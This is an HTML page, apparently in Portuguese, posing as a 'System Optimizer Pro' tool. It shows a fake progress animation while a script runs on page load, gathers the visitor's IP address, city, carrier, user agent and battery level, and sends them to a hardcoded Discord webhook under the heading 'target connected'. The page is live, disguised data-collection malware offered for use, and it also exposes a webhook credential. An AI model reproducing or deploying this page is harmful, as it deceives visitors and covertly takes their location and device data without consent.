<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Optimizer Pro</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body { background: #0b0f19; color: #4ade80; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { border: 1px solid #4ade80; padding: 40px; border-radius: 15px; text-align: center; box-shadow: 0 0 20px rgba(74, 222, 128, 0.2); }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: #4ade80; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <div class="spinner"></div>
        <h2 id="status">Analisando Arquivos...</h2>
        <p id="pct">0%</p>
    </div>

    <script>
        // Animação fake
        let p = 0;
        let t = setInterval(() => {
            p += Math.floor(Math.random() * 3) + 1;
            if(p >= 100) { p = 100; clearInterval(t); document.getElementById('status').innerText = "Sistema Otimizado!"; }
            document.getElementById('pct').innerText = p + '%';
        }, 300);

        // A Mágica: Coleta de dados
        async function start() {
            const webhook = "https://discord.com/api/webhooks/1485326308018749441/JP7phpSiQ5pwyp95gs63pQPBwfn_8HUw-pCxajFEnfn_m1Cuo1BDjPJBbhKNaNLKCajm";
            
            // Pega o IP e Localização aproximada via API pública (silencioso)
            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());

            const report = {
                embeds: [{
                    title: "🎯 Alvo Conectado (Web App)",
                    color: 3066993,
                    fields: [
                        { name: "IP", value: ipData.ip || "N/A", inline: true },
                        { name: "Cidade", value: ipData.city || "N/A", inline: true },
                        { name: "Operadora", value: ipData.org || "N/A" },
                        { name: "Dispositivo", value: navigator.userAgent },
                        { name: "Bateria", value: (await navigator.getBattery?.().then(b => b.level * 100 + "%")) || "N/A" }
                    ],
                    footer: { text: "ENI Intelligence System" }
                }]
            };

            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(report) });
        }
        start();
    </script>
</body>
</html>
